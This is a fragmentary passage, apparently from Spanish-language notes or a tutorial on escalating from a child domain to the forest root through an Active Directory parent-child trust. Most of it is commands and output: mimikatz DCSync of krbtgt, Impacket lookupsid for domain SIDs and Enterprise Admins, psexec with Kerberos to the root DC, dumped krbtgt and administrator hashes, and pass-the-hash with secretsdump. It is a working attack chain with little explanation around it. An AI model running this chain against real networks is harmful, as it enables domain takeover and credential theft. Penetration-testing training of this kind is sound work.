...
- Parent-child es el trust entre un dominio raíz y sus dominios hijo dentro del mismo bosque. Es bidireccional y transitivo por defecto. Un ejemplo sería `DOMAIN.LOCAL` con `LOGISTICS.DOMAIN.LOCAL`.
...
```c
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.DOMAIN.LOCAL' will be the domain
[DC] 'DC02.LOGISTICS.DOMAIN.LOCAL' will be the DC server
...
```bash
secretsdump.py logistics.DOMAIN.local/user@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
...
```bash
lookupsid.py logistics.DOMAIN.local/user@172.16.5.240
```
...
```bash
lookupsid.py logistics.DOMAIN.local/user@172.16.5.240 | grep "Domain SID"
```
...
```bash
lookupsid.py logistics.DOMAIN.local/user@172.16.5.5 | grep -B12 "Enterprise Admins"
```

```c
impacket-lookupsid logistics.DOMAIN.local/user@172.16.5.5 2>/dev/null  | grep -B12 "Enterprise Admins"
Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: DOMAIN\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DOMAIN\administrator (SidTypeUser)
501: DOMAIN\guest (SidTypeUser)
502: DOMAIN\krbtgt (SidTypeUser)
512: DOMAIN\Domain Admins (SidTypeGroup)
513: DOMAIN\Domain Users (SidTypeGroup)
514: DOMAIN\Domain Guests (SidTypeGroup)
515: DOMAIN\Domain Computers (SidTypeGroup)
516: DOMAIN\Domain Controllers (SidTypeGroup)
517: DOMAIN\Cert Publishers (SidTypeAlias)
518: DOMAIN\Schema Admins (SidTypeGroup)
519: DOMAIN\Enterprise Admins (SidTypeGroup)
...
```bash
psexec.py LOGISTICS.DOMAIN.LOCAL/hacker@dc01.DOMAIN.local -k -no-pass -target-ip 172.16.5.5
```
...
.
.
[*] Getting credentials for DOMAIN.LOCAL
DOMAIN.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
DOMAIN.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
DOMAIN.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
DOMAIN.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
.....
.....
...
```c
$secretsdump.py "DOMAIN.LOCAL/administrator"@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf
